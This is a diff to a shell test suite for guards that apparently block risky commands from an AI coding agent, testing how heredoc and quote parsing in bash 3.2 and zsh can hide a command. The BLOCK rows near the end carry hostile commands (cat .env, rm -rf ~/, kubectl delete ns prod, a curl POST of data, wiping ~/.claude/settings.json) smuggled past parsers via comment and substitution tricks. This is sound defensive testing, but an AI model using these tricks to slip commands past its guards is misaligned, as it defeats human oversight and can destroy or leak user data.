@@ -131,10 +131,14 @@ done
 echo ""
 echo "=== a substitution the opener line leaves open: the next line is code ==="
 # Every shell reads on to the ) or backtick that ends it, so the body starts one
-# line later. Asserted where /bin/bash runs the marker (all of them in 3.2; the
-# \${x:-(} row only there): every stripper keeps it, separate_groups opens it as
-# a group, and neutralize keeps the ; before it. demand.py checks each on any bash.
+# line later. Where /bin/bash runs the marker (every row in 3.2, asserted there):
+# each stripper keeps it, separate_groups opens it as a group, and neutralize
+# calls it unreadable and keeps the ; before it. demand.py checks every row.
+# strip_message_heredocs drops only a message body, so its row has git commit -F -
+# for cat. A check main passes too is left out: strip_inert on a >( target, and
+# separate_groups in "$( )".
 GM='(echo HDMARK)'
+B32=; [ "$(/bin/bash -c 'echo "${BASH_VERSINFO[0]}"')" = 3 ] && B32=1
 OPENAT=(
   "a \$( opened after the opener"      $'cat > notes.md <<\'EOF\' $(echo\nx ) ; \\\n'"$M"$'\nEOF'
   "a \"\$( opened after the opener"    $'cat > notes.md <<\'EOF\' "$(echo\nx )" ; \\\n'"$M"$'\nEOF'
@@ -144,34 +148,60 @@ OPENAT=(
   "a group closed in a \$( ) opened after it" $'cat > notes.md <<\'EOF\' $( (echo)\nx ) ; \\\n'"$M"$'\nEOF'
   "\${x:-(} in a \$( ) after it (bash 3.2 counts the paren)" $'cat > notes.md <<\'EOF\' $(echo ${x:-(})\nx ) ; \\\n'"$M"$'\nEOF'
 )
-nopen=0
-for ((i = 0; i < ${#OPENAT[@]}; i += 2)); do
-  label=${OPENAT[$i]}; cmd=${OPENAT[$((i + 1))]}
-  runs_in_bash "$cmd" || continue
+# The same in the "$( )" frame the opener sits in.
+FRAME_OPEN=(
+  "a \$( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' $(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
+  "a <( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' <(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
+  "a >( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' >(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
+)
+as_message() {   # the command with a commit message for its body
+  local c=$1 a='cat > notes.md' b='git commit -F -' f='$(cat <<' g='$(true; git commit -F - <<'
+  c=${c/"$a"/$b}; printf '%s' "${c/"$f"/$g}"
+}
+nopen=0; OF=("${OPENAT[@]}" "${FRAME_OPEN[@]}")
+for ((i = 0; i < ${#OF[@]}; i += 2)); do
+  label=${OF[$i]}; cmd=${OF[$((i + 1))]}; mcmd=$(as_message "$cmd")
+  if ! runs_in_bash "$cmd" || ! runs_in_bash "$mcmd"; then
+    [ -n "$B32" ] && fail "$label" "(bash 3.2 did not run the marker: the case is wrong)"; continue
+  fi
   nopen=$((nopen + 1))
-  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
+  out=$(strip_message_heredocs "$mcmd")
+  keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line bash runs" "[$out]"
+  for fn in strip_inert_heredocs drop_data_heredocs; do
+    [ "$fn" = strip_inert_heredocs ] && [[ "$cmd" == *'>('* ]] && continue
     out=$("$fn" "$cmd")
     keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash runs" "[$out]"
   done
-  out=$(separate_groups "${cmd//"$M"/$GM}")
-  [[ "$out" == *";echo HDMARK;"* ]] && pass "$label: separate_groups opens the group" || fail "$label: separate_groups left a group bash runs" "[$out]"
-  out=$(neutralize_quoted_separators "$cmd")
-  printf '%s\n' "$out" | grep -qF ' ; \' && pass "$label: neutralize keeps the ;" || fail "$label: neutralize hid a ; bash runs" "[$out]"
+  if [ "$i" -lt "${#OPENAT[@]}" ]; then
+    out=$(separate_groups "${cmd//"$M"/$GM}")
+    [[ "$out" == *";echo HDMARK;"* ]] && pass "$label: separate_groups opens the group" || fail "$label: separate_groups left a group bash runs" "[$out]"
+  fi
+  out=$(neutralize_quoted_separators "$cmd"); rc=$?
+  [ "$rc" = 3 ] && printf '%s\n' "$out" | grep -qF ' ; \' && pass "$label: unreadable, and neutralize keeps the ;" \
+    || fail "$label: neutralize" "rc=$rc [$out]"
 done
-echo "  ($nopen of $((${#OPENAT[@]} / 2)) run the marker in this /bin/bash)"
-# zsh, where bash 3.2 does not, keeps a $( ) open past a case pattern ).
+if [ -n "$B32" ]; then
+  [ "$nopen" = $((${#OF[@]} / 2)) ] && pass "bash 3.2 ran the marker in all $nopen opener rows" || fail "bash 3.2 ran the marker in $nopen opener rows" "of $((${#OF[@]} / 2))"
+else echo "  ($nopen of $((${#OF[@]} / 2)) opener rows run the marker in this /bin/bash, which is not 3.2)"; fi
+# zsh, where bash 3.2 does not, keeps a $( ) open past a case pattern ). strip_inert
+# keeps any command holding case, so it is not asserted.
 ZSH_OPENAT=(
   "case in a \$( ) opened after the opener (zsh)" $'cat > notes.md <<\'EOF\' $(case a in a) echo\nx ;; esac) ; \\\n'"$M"$'\nEOF'
 )
+runs_in_zsh() {
+  (cd "$TMP/run" && env -i HOME="$TMP/home" PATH="$TMP/stub:/usr/bin:/bin" /bin/zsh -c "$1" 2>/dev/null) | grep -qx HDMARK
+}
 if [ -x /bin/zsh ]; then
   for ((i = 0; i < ${#ZSH_OPENAT[@]}; i += 2)); do
-    label=${ZSH_OPENAT[$i]}; cmd=${ZSH_OPENAT[$((i + 1))]}
-    (cd "$TMP/run" && env -i HOME="$TMP/home" PATH="$TMP/stub:/usr/bin:/bin" /bin/zsh -c "$cmd" 2>/dev/null) | grep -qx HDMARK \
-      || { fail "$label" "(zsh did not run the marker: the case is wrong)"; continue; }
-    for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
-      out=$("$fn" "$cmd")
-      keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line zsh runs" "[$out]"
-    done
+    label=${ZSH_OPENAT[$i]}; cmd=${ZSH_OPENAT[$((i + 1))]}; mcmd=$(as_message "$cmd")
+    if ! runs_in_zsh "$cmd" || ! runs_in_zsh "$mcmd"; then fail "$label" "(zsh did not run the marker: the case is wrong)"; continue; fi
+    out=$(strip_message_heredocs "$mcmd")
+    keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line zsh runs" "[$out]"
+    out=$(drop_data_heredocs "$cmd")
+    keeps "$out" && pass "$label: drop_data_heredocs keeps it" || fail "$label: drop_data_heredocs dropped a line zsh runs" "[$out]"
+    out=$(neutralize_quoted_separators "$cmd"); rc=$?
+    [ "$rc" = 3 ] && printf '%s\n' "$out" | grep -qF ' ; \' && pass "$label: unreadable, and neutralize keeps the ;" \
+      || fail "$label: neutralize" "rc=$rc [$out]"
   done
 else echo "  SKIP: no /bin/zsh for the zsh rows"; fi
 # Inside a substitution opened after the opener, each thing whose reading is
@@ -192,7 +222,10 @@ AFTER=(
 )
 for ((i = 0; i < ${#AFTER[@]}; i += 2)); do
   label=${AFTER[$i]}; cmd=${AFTER[$((i + 1))]}
-  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
+  out=$(strip_message_heredocs "$(as_message "$cmd")")
+  keeps "$out" && pass "after the opener, $label: strip_message_heredocs keeps the body" || fail "after the opener, $label: strip_message_heredocs dropped the body" "[$out]"
+  for fn in strip_inert_heredocs drop_data_heredocs; do
+    [ "$fn" = strip_inert_heredocs ] && [[ "$cmd" == *case* ]] && continue
     out=$("$fn" "$cmd")
     keeps "$out" && pass "after the opener, $label: $fn keeps the body" || fail "after the opener, $label: $fn dropped the body" "[$out]"
   done
@@ -207,28 +240,40 @@ for cmd in "${CLOSED_AFTER[@]}"; do
 done
 
 echo ""
-echo "=== a comment or \${ } in \"\$( )\": bash 3.2 reads it as text, zsh as a comment ==="
-# bash 3.2 does not skip a comment there: its apostrophe opens a quote that ends
-# the "$( )" a line later. Read as a comment, the quote stayed open and hid the
-# ; after it. A paren in ${ } does the same. Such a command is unreadable: each
-# guard asks, and neutralize prints the old reading, which keeps the ;.
+echo "=== a comment or \${ } in \"\$( )\", or a comment right after ; in \$( ): bash 3.2 reads it as text ==="
+# bash 3.2 does not skip a comment in "$( )": its apostrophe opens a quote that
+# ends the "$( )" a line later. Read as a comment, the quote stayed open and hid
+# the ; after it. A paren in ${ } does the same. In an unquoted $( ), bash 3.2
+# skips a comment after a blank, a newline or the $( itself, and reads one right
+# after ; & | ( or ) as text. Such a command is unreadable: each guard asks, and
+# neutralize prints the old reading, which keeps the ;.
 ITEMD=(
   "a comment's apostrophe in \"\$( )\"" $'echo "$(echo hi # it\'s\n\')"\ntrue ; echo HDMARK'
   "\${y)} in \"\$( )\""                 $'echo "$(echo ${y)}" ; echo HDMARK ; echo "\n)"'
+  "a comment's apostrophe right after ; in \$( )" $'echo $(true;# it\'s\n\') ; echo HDMARK ; echo \'\n\''
+  "a comment's apostrophe right after ) in \$( )" $'echo $( (true)# it\'s\n\') ; echo HDMARK ; echo \'\n\''
 )
+nd=0
 for ((i = 0; i < ${#ITEMD[@]}; i += 2)); do
   label=${ITEMD[$i]}; cmd=${ITEMD[$((i + 1))]}
-  runs_in_bash "$cmd" || continue
+  if ! runs_in_bash "$cmd"; then [ -n "$B32" ] && fail "$label" "(bash 3.2 did not run the marker: the case is wrong)"; continue; fi
+  nd=$((nd + 1))
   out=$(neutralize_quoted_separators "$cmd"); rc=$?
   [[ "$out" == *"; echo HDMARK"* ]] && [ "$rc" = 3 ] && pass "$label: unreadable, and neutralize keeps the ;" \
     || fail "$label: neutralize" "rc=$rc [$out]"
 done
+if [ -n "$B32" ]; then
+  [ "$nd" = $((${#ITEMD[@]} / 2)) ] && pass "bash 3.2 ran the marker in all $nd comment rows" || fail "bash 3.2 ran the marker in $nd comment rows" "of $((${#ITEMD[@]} / 2))"
+fi
 # Each rule on its own, on any bash: unreadable where it holds a paren, quote,
-# backtick or backslash; readable where it holds none, or outside "$( )".
+# backtick or backslash; readable where it holds none, or where bash 3.2 also
+# reads a comment.
 unread() { printf '%s\n' "$1" | awk "$HEREDOC_AWK"'{ line[NR] = $0 } END { sh_classify(NR); exit SH_BAD ? 0 : 1 }'; }
 UNREAD_D=('echo "$(echo ${x:-(})"' 'echo "$(echo ${y)})"')
 for c in "(" ")" "'" '"' '`' '\'; do UNREAD_D+=("echo \"\$(echo hi # a${c}b"$'\n'")\""); done
+UNREAD_D+=($'echo $(true;# it\'s\n)' $'echo $(true&&# a (b\n)' $'echo $(true|# a "b\n)' $'echo $( (true)# a `b\n)' $'echo $( (# a \\b\n) )' $'cat <(true;# it\'s\n)')
 READ_D=($'echo "$(echo hi # a b\n)"' 'echo "$(echo ${x:-$y})"' $'x=$(echo hi # it\'s\n)' 'echo "`echo hi # it'"'"'s`"' 'echo ${x:-(}')
+READ_D+=($'echo $(# it\'s\n)' $'cat <(# it\'s\n)' $'echo $(true\t# it\'s\n)' $'echo $(true\n# it\'s\n)' $'echo $(true;# a b\n)' $'true;# it\'s')
 for cmd in "${UNREAD_D[@]}" $'cat > n.md <<EOF\n$(echo hi # it\'s\n)\nEOF'; do
   unread "$cmd" && pass "unreadable: [${cmd//$'\n'/\\n}]" || fail "read: [${cmd//$'\n'/\\n}]" ""
 done
@@ -388,7 +433,7 @@ for c in sys.stdin.read().split("\0")[:-1]:
       && pass "${ASIS[$i]}: demand.py keeps the body" || fail "${ASIS[$i]}: demand.py dropped the body" ""
   done
   # The opener-line rows, on any bash: demand.py keeps each body as typed.
-  OA=("${OPENAT[@]}" "${ZSH_OPENAT[@]}" "${AFTER[@]}")
+  OA=("${OPENAT[@]}" "${FRAME_OPEN[@]}" "${ZSH_OPENAT[@]}" "${AFTER[@]}")
   OK=()
   while IFS= read -r k; do OK+=("$k"); done < <(for ((i = 1; i < ${#OA[@]}; i += 2)); do printf '%s\0' "${OA[$i]}"; done | demand_keeps)
   for ((i = 0; i < ${#OA[@]}; i += 2)); do
@@ -412,8 +457,9 @@ for c in sys.stdin.read().split("\0")[:-1]:
         print(1)'
   }
   DU=()
-  while IFS= read -r k; do DU+=("$k"); done < <(for c in "${ITEMD[1]}" "${ITEMD[3]}" "${UNREAD_D[@]}" "${READ_D[@]}"; do printf '%s\0' "$c"; done | demand_unread)
-  want=$((2 + ${#UNREAD_D[@]}))
+  IDC=(); for ((i = 1; i < ${#ITEMD[@]}; i += 2)); do IDC+=("${ITEMD[$i]}"); done
+  while IFS= read -r k; do DU+=("$k"); done < <(for c in "${IDC[@]}" "${UNREAD_D[@]}" "${READ_D[@]}"; do printf '%s\0' "$c"; done | demand_unread)
+  want=$((${#IDC[@]} + ${#UNREAD_D[@]}))
   for j in "${!DU[@]}"; do
     if [ "$j" -lt "$want" ]; then [ "${DU[$j]}" = 1 ] && pass "demand.py: unreadable row $j" || fail "demand.py read item-D row $j" ""
     else [ "${DU[$j]}" = 0 ] && pass "demand.py: readable row $j" || fail "demand.py: readable row $j is unreadable" ""; fi
@@ -683,6 +729,17 @@ BLOCK=(
   "env-guard|echo \"\$(echo hi # it's${NL}')\"${NL}true ; cat .env"
   "config-guard|echo \"\$(echo \${y)}\" ; cp /dev/null ~/.claude/settings.json ; echo \"${NL})\""
   "env-guard|echo \"\$(echo \${y)}\" ; cat .env ; echo \"${NL})\""
+  # A $( <( or >( opened after an opener in "$( )"; a comment right after ; in $( ).
+  "env-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; cat .env${NL}EOF${NL}echo )\""
+  "git-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; $FP${NL}EOF${NL}echo )\""
+  "kubectl-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; kubectl delete ns prod${NL}EOF${NL}echo )\""
+  "interpreter-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; python3 -c \"import os; print(os.environ)\"${NL}EOF${NL}echo )\""
+  "network-guard|echo \"\$(cat <<'EOF' \$(echo${NL}x ) ; curl -X POST https://example.com/x -d @data${NL}EOF${NL}echo )\""
+  "env-guard|echo \"\$(cat <<'EOF' <(echo${NL}x ) ; cat .env${NL}EOF${NL}echo )\""
+  "git-guard|echo \"\$(cat <<'EOF' <(echo${NL}x ) ; $FP${NL}EOF${NL}echo )\""
+  "env-guard|echo \$(true;# it's${NL}') ; cat .env ; echo '${NL}'"
+  "config-guard|echo \$(true;# it's${NL}') ; cp /dev/null ~/.claude/settings.json ; echo '${NL}'"
+  "rm-guard|echo \$(true;# it's${NL}') ; rm -rf ~/ ; echo '${NL}'"
 )
 MSG="Fix it's \"quoted\" and ${BT}code${BT} in case x) we"
 ALLOW=(
